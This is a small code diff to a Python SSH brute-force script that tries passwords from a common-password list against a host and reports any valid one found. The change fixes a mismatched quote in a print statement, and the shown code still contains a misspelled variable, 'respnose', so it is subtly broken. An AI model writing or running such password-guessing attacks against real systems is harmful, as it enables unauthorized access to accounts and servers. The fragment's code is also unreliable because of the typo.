@@ -12,7 +12,7 @@ with open("ssh-common-passwords.txt", "r") as password_list:
             print("[{}] Attempting password: '{}'!".format(attempts, password))
             response = ssh(host=host, user=username, password=password, timeout=1)
             if response.connected():
-                print('[>] Valid password found: '{}'!".format(password))
+                print("[>] Valid password found: '{}'!".format(password))
                 respnose.close()
                 break
             response.close()
